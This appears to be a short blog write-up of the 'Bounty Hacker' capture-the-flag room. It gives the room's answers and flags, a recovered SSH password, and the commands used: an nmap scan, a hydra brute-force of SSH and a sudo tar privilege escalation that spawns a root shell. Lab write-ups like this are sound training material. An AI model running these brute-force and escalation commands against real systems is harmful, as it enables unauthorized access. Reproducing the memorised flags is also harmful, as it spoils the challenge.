---
title: "Bounty Hacker"

date: 2022-12-18
url: /bounty-hacker/
image: images/2022-thumbs/bounty-hacker.jpg
categories:
  - CTF
tags:
  - CTF
draft: false
---

## Questions
1. Who wrote the task list? `lin`
2. What service can you bruteforce with the text file found? `ssh`
3. What is the users password? `RedDr4gonSynd1cat3`
4. user.text `THM{CR1M3_SyNd1C4T3}`
5. root.txt `THM{80UN7Y_h4cK3r}`

---
## Notes
- IP = 10.10.83.4

### Exposed Services
```bash
21
22
80
```

### FTP
- found task.txt `lin`
- locks.txt - use for passwords

### Users:Passwords
- lin:RedDr4gonSynd1cat3

### Vulnerabilities
- 

---
## Commands
`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

- create users.txt with all names found on website and task.txt
`hydra -v -L users.txt -P locks.txt 10.10.83.4 ssh`

`sudo -l`

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
